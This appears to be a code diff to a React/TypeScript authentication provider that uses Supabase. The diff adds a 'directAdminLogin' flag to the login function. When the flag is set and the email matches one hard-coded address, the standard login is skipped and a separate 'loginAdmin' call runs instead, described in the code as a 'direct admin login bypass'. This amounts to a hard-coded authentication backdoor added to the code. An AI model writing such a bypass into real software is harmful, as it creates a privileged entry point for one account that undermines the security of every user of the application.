@@ -103,7 +103,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   }, []);
 
   // Demo login with email and password
-  const login = async (email: string, password: string) => {
+  const login = async (email: string, password: string, directAdminLogin: boolean = false) => {
     setIsLoading(true);
     try {
       // Check if we should use demo/mock login
@@ -119,7 +119,15 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         return false;
       } else {
         // Real authentication with Supabase
-        const response = await authService.login(email, password);
+        let response;
+        
+        if (directAdminLogin && email.toLowerCase() === 'gitedu@bk.ru') {
+          // Use direct admin login bypass
+          response = await authService.loginAdmin(email, password);
+        } else {
+          // Standard login
+          response = await authService.login(email, password);
+        }
         
         if (response.success && response.user) {
           setUser(response.user);
